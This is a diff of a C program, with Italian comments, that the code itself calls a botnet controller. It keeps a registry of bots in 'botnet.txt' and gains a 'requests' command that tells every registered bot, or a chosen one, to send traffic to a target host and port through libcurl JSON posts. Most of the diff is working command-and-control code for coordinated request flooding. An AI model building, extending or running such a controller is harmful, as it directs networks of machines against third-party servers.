@@ -10,7 +10,7 @@
 
 #define CHECK_ACTIVE_BOT_TIMEOUT 500L
 
-const char *bot_list_file_name = "bot-list.txt";
+const char *bot_list_file_name = "botnet.txt";
 
 void handle_get_request(int client_socket);
 
@@ -34,9 +34,14 @@ void get_bot_info(int record_id);
 
 void get_bot_info_request(const char *ip, const char *port);
 
-size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp);
+size_t write_callback_get_bot_info_request(void *contents, size_t size, size_t nmemb, void *userp);
+
 
 void print_page_and_wait(const char *text);
+
+int send_request(char *host, char *port, char *targetHost, char *targetPort, int index);
+
+int send_requests_through_bots(char *host, char *port, int index);
 
 // Definizione di una struttura per passare i parametri al thread
 struct ThreadArgs {
@@ -84,42 +89,43 @@ int main(int argc, char *argv[]) {
                 printf("%s\n", server_info);
                 free(server_info);
             } else {
-                printf("Error reading the %s file.\n", bot_list_file_name);
+                printf("No bot in botnet.\n");
             }
             printf("\n");
         }
             // get info command
         else if (strncmp(command, "get info ", 9) == 0) {
             int bot_id = atoi(command + 9); // Estrai l'argomento numerico dopo "get info "
-
             // Esegui la funzione getInfo con l'ID del bot
+            update_bot_list();
             get_bot_info(bot_id);
         }
-            // request command
+            // get status command
         else if (strcmp(command, "get status\n") == 0) {
             printf("get status!\n\n");
+            // requests command
         } else if (strncmp(command, "requests", 8) == 0) {
             char targetHost[256];
             char targetPort[10];
             char client[5];
-            int parsed = sscanf(command, "requests %255s %255s %255s", &targetHost, &targetPort, &client);
+            int parsed = sscanf(command, "requests %255s %255s %255s", targetHost, targetPort, client);
 
             if (parsed != 3) {
-                printf(stderr, "Malformed command\n");
+                printf("Malformed command\n");
                 continue;
             }
-
+            update_bot_list();
             struct ThreadArgs *args = (struct ThreadArgs *) malloc(sizeof(struct ThreadArgs));
             args->targetHost = strdup(targetHost);
             args->targetPort = targetPort;
             args->client = client;
 
-            pthread_t thread;
-            pthread_create(&thread, NULL, send_request_thread, args);
+            pthread_t request_thread_id;
+            pthread_create(&request_thread_id, NULL, send_request_thread, args);
 
             // Attendere la terminazione del thread
             int *result;
-            if (pthread_join(server_thread_id, (void **) &result) != 0) {
+            if (pthread_join(request_thread_id, (void **) &result) != 0) {
                 perror("Error joining requests thread");
                 return 1;
             }
@@ -144,25 +150,93 @@ int main(int argc, char *argv[]) {
 
 // Funzione del thread per la gestione del server e delle richieste
 void *server_thread(void *arg) {
+    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);//abilito cancellazione
     int port = *((int *) arg);
     int result = start_server(port);
     pthread_exit((void *) &result); // Passa l'intero direttamente senza cast
 }
 
 void *send_request_thread(void *args) {
+
+    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);//abilito cancellazione
+
     struct ThreadArgs *threadArgs = (struct ThreadArgs *) args;
     char *targetHost = threadArgs->targetHost;
     char *targetPort = threadArgs->targetPort;
     char *client = threadArgs->client;
+    int index = -1;
+    if (strcmp(client, "*") != 0) {
+        index = atoi(client);
+    }
+    int result = send_requests_through_bots(targetHost, targetPort, index);
 
-    printf("target %s\n", targetHost);
-    printf("port %s\n", targetPort);
-    printf("client %s\n", client);
-
-    free(targetHost);
     free(threadArgs);
+    pthread_exit((void *) &result); // Passa l'intero direttamente senza cast
+}
 
-    return NULL;
+//risposta di requests
+size_t write_callback_send_request(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t real_size = size * nmemb;
+    char *response = (char *) userp;
+
+    // Concateniamo i dati ricevuti dalla risposta alla variabile response
+    strncat(response, (char *) contents, real_size);
+
+    return real_size;
+}
+
+// Function to send a synchronous request
+int send_request(char *host, char *port, char *targetHost, char *targetPort, int index) {
+    CURL *curl;
+    CURLcode res;
+    char *response = (char *) malloc(1); // Inizializza con una stringa vuota
+    size_t newline_pos = strcspn(port, "\n");
+
+    // Verifica se il carattere '\n' è stato trovato
+    if (port[newline_pos] == '\n') {
+        // Sostituisci il carattere '\n' con il terminatore di stringa '\0'
+        port[newline_pos] = '\0';
+    }
+
+    curl = curl_easy_init();
+    if (curl) {
+        char url[100];
+        snprintf(url, sizeof(url), "http://%s:%s", host, port);
+
+        struct json_object *request_json = json_object_new_object();
+        json_object_object_add(request_json, "command", json_object_new_string("requests"));
+        json_object_object_add(request_json, "host", json_object_new_string(targetHost));
+        json_object_object_add(request_json, "port", json_object_new_string(targetPort));
+        const char *request_data = json_object_to_json_string(request_json);
+
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_send_request);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+        res = curl_easy_perform(curl);
+
+        if (res == CURLE_OK) {
+            // Handle the response here, e.g., write to a log file
+//            FILE *log_file = fopen("requests.log", "a");
+//            if (log_file) {
+//                time_t current_time = time(NULL);
+//                char timestamp[64];
+//                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&current_time));
+//                fprintf(log_file, "timestamp: %s | bot %s on port %s start send request to %s on port %s\n", timestamp, host, port, targetHost, targetPort);
+//                fclose(log_file);
+//            } else {
+//                printf("Failed to open log file\n");
+//                return 1;
+//            }
+        } else {
+            printf("Error in the request: %s\n", curl_easy_strerror(res));
+            return 1;
+        }
+        curl_easy_cleanup(curl);
+        json_object_put(request_json);
+    }
+    return 0;
 }
 
 // Start server
@@ -261,73 +335,53 @@ void handle_post_request(int client_socket, const char *data) {
         struct array_list *ports_array = json_object_get_array(ports_obj);
         int num_ports = ports_array->length;
 
-        // Apri o crea il file bot-list.txt in modalità scrittura
+        // Apri o crea il file bot-list.txt in modalità append ("a+")
         FILE *file = fopen(bot_list_file_name, "a+");
         if (file == NULL) {
             send_response(client_socket, 500, "Internal Server Error", "Failed to open file");
             json_object_put(json_obj);
             return;
         }
-
-        // Cerca il clientIP nel file e aggiorna o aggiungi la riga
+        int index = 0;
+        // Determina l'indice progressivo
         char line[1024];
-        int count = 1;
-
-        FILE *temp_file = fopen("temp.txt", "w"); // Crea un nuovo file temporaneo
-        if (temp_file == NULL) {
-            perror("Error creating temporary file");
-            return;
-        }
-
-        int found = 0;
-
         while (fgets(line, sizeof(line), file)) {
-            char saved_clientIP[256];
-            sscanf(line, "%*d|%255[^|]", saved_clientIP);
-
-            if (strcmp(clientIP, saved_clientIP) == 0) {
-                // Il clientIP esiste, quindi aggiorna la riga
-                fprintf(temp_file, "%d|%s|", count, clientIP);
-                for (int i = 0; i < num_ports; i++) {
-                    struct json_object *port = json_object_array_get_idx(ports_obj, i);
-                    if (i == num_ports - 1) {
-                        fprintf(temp_file, "%s", json_object_get_string(port));
-                    } else {
-                        fprintf(temp_file, "%s|", json_object_get_string(port));
-                    }
-                }
-                fprintf(temp_file, "\n");
-                found = 1;
-            } else {
-                // Se il clientIP non corrisponde, copia semplicemente la riga nel nuovo file
-                fputs(line, temp_file);
-            }
-            count++;
+            index++;
         }
-        if (!found) {
-            // Se il clientIP non è stato trovato, aggiungi un nuovo record
-            fprintf(temp_file, "%d|%s|", count, clientIP);
-            for (int i = 0; i < num_ports; i++) {
-                struct json_object *port = json_object_array_get_idx(ports_obj, i);
-                if (i == num_ports - 1) {
-                    fprintf(temp_file, "%s", json_object_get_string(port));
-                } else {
-                    fprintf(temp_file, "%s|", json_object_get_string(port));
+
+        int added_count = 0; // Contatore per le righe aggiunte
+
+        // Array temporaneo per tenere traccia dei valori delle porte già processati
+        const char *processed_ports[1024];
+        int processed_count = 0;
+
+        for (int i = 0; i < num_ports; i++) {
+            index++;
+            const char *port = json_object_get_string(json_object_array_get_idx(ports_obj, i));
+
+            // Verifica se la porta è stata già processata
+            int is_duplicate = 0;
+            for (int j = 0; j < processed_count; j++) {
+                if (strcmp(port, processed_ports[j]) == 0) {
+                    is_duplicate = 1;
+                    break;
                 }
             }
-            fprintf(temp_file, "\n");
+
+            if (!is_duplicate) {
+                // La porta non è duplicata, quindi la aggiungiamo al set di porte processate
+                processed_ports[processed_count++] = port;
+
+                // Scrivi una nuova riga con l'indice progressivo
+                fprintf(file, "%d|%s|%s\n", index, clientIP, port);
+                added_count++;
+            }
         }
 
         fclose(file);
-        fclose(temp_file);
 
-        // Rinomina il file temporaneo in quello originale
-        if (rename("temp.txt", bot_list_file_name) != 0) {
-            perror("Error renaming the file");
-            return;
-        }
         // Invia una risposta di successo al client
-        send_response(client_socket, 200, "OK", "Data updated or added successfully");
+        send_response(client_socket, 200, "OK", added_count > 0 ? "Data added successfully" : "No new data added");
     } else {
         send_response(client_socket, 400, "Bad Request", "Invalid JSON format");
     }
@@ -345,7 +399,6 @@ void send_response(int client_socket, int status_code, const char *status_text, 
 void update_bot_list() {
     FILE *file = fopen(bot_list_file_name, "r");
     if (file == NULL) {
-        perror("Error opening file");
         return;
     }
 
@@ -370,34 +423,25 @@ void update_bot_list() {
         }
 
         int is_active_record = 0;
-        int active_ports[100];
-        int port_count = 0;
         int field_count = 0;
         char *port_str = strtok(line, "|");
         while (port_str != NULL) {
-            if (field_count > 1) {
+            if (field_count == 2) {
                 if (sscanf(port_str, "%d", &port) == 1) {
                     if (is_bot_active(clientIP, port) == 1) {
                         // Il server è attivo su questa porta
-                        active_ports[port_count] = port;
-                        port_count++;
                         is_active_record = 1;
                     }
                 }
+                break;
             }
             field_count++;
             port_str = strtok(NULL, "|");
         }
 
         if (is_active_record) {
-            fprintf(temp, "%d|%s|", record_number, clientIP); // Scrivi il progressivo e l'IP nel file temporaneo
-            for (int i = 0; i < port_count; i++) {
-                if (i == port_count - 1) {
-                    fprintf(temp, "%d\n", active_ports[i]);
-                    break;
-                }
-                fprintf(temp, "%d|", active_ports[i]);
-            }
+            fprintf(temp, "%d|%s|%d\n", record_number, clientIP,
+                    port); // Scrivi il progressivo e l'IP nel file temporaneo
             record_number++; // Incrementa il contatore solo se non è il primo record
         }
     }
@@ -505,7 +549,7 @@ char *get_formatted_server_info() {
 void get_bot_info(int record_id) {
     FILE *file = fopen(bot_list_file_name, "r");
     if (!file) {
-        perror("File open error");
+        printf("No bot in botnet.\n\n");
         return;
     }
 
@@ -519,12 +563,11 @@ void get_bot_info(int record_id) {
                 // Formato di riga non valido, salta
                 continue;
             }
-            count_id++;
             int field_count = 0;
             int port;
             char *port_str = strtok(line, "|");
             while (port_str != NULL) {
-                if (field_count > 1) {
+                if (field_count == 2) {
                     if (sscanf(port_str, "%d", &port) == 1) {
                         get_bot_info_request(record_ip, port_str);
                         port_str = strtok(NULL, "|");
@@ -535,6 +578,7 @@ void get_bot_info(int record_id) {
                 port_str = strtok(NULL, "|");
             }
         }
+        count_id++;
     }
     fclose(file);
 }
@@ -559,7 +603,7 @@ void get_bot_info_request(const char *ip, const char *port_str) {
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_data);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_get_bot_info_request);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 
         res = curl_easy_perform(curl);
@@ -601,7 +645,8 @@ void get_bot_info_request(const char *ip, const char *port_str) {
     }
 }
 
-size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
+//write back for get_bot_info
+size_t write_callback_get_bot_info_request(void *contents, size_t size, size_t nmemb, void *userp) {
     size_t realsize = size * nmemb;
     char **response = (char **) userp;
 
@@ -661,3 +706,34 @@ void print_page_and_wait(const char *text) {
 
     endwin();  // Termina ncurses
 }
+
+int send_requests_through_bots(char *targetHost, char *targetPort, int index) {
+    FILE *file = fopen(bot_list_file_name, "r");
+    if (!file) {
+        printf("no bot in botnet\n\n");
+        return 1;
+    }
+
+    char line[100];
+    int current_index = 0;
+    int result;
+    while (fgets(line, sizeof(line), file)) {
+        current_index++;
+        if (index == -1 || current_index == index) {
+            char *index = strtok(line, "|");
+            char *host = strtok(NULL, "|");
+            char *port = strtok(NULL, "|");
+            if (host && port) {
+                result = send_request(host, port, targetHost, targetPort, current_index);
+                if (result != 0) {
+                    fclose((file));
+                    return result;
+                }
+            }
+        }
+    }
+
+    fclose(file);
+    return 0;
+}
+
